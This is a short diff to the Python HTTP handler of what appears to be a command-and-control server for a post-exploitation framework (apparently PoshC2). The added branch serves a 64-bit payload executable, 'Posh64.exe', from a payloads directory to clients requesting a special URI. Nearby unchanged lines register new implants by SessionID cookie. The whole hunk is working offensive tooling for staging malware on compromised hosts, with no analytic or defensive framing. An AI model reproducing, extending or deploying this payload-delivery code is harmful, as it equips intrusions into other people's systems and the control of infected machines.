@@ -104,6 +104,15 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
           s.send_header("Content-type", "application/x-msdownload")
           s.end_headers()
           s.wfile.write(content)
+
+        elif ("%s_ex6" % QuickCommandURI) in s.path:
+          filename = "%sPosh64.exe" % (PayloadsDirectory)
+          with open(filename, 'rb') as f:
+            content = f.read()
+          s.send_response(200)
+          s.send_header("Content-type", "application/x-msdownload")
+          s.end_headers()
+          s.wfile.write(content)
         # class Implant()
         # register new implant
         elif new_implant_url in s.path and s.cookieHeader.startswith("SessionID"):
